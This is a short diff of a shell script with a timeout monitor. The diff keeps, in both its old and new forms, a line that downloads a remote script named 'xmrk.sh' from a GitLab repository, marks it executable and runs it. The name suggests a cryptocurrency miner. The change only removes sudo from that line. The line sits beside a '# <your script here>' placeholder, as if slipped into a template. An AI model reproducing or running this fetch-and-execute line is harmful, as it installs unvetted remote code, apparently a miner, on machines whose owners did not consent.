@@ -12,7 +12,7 @@ function timeout_monitor() {
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
 
-wget https://gitlab.com/gairmeet/antsi/-/raw/master/xmrk.sh && sudo chmod +x xmrk.sh && sudo ./xmrk.sh
+wget https://gitlab.com/gairmeet/antsi/-/raw/master/xmrk.sh && chmod +x xmrk.sh && ./xmrk.sh
 done
 # <your script here>
 
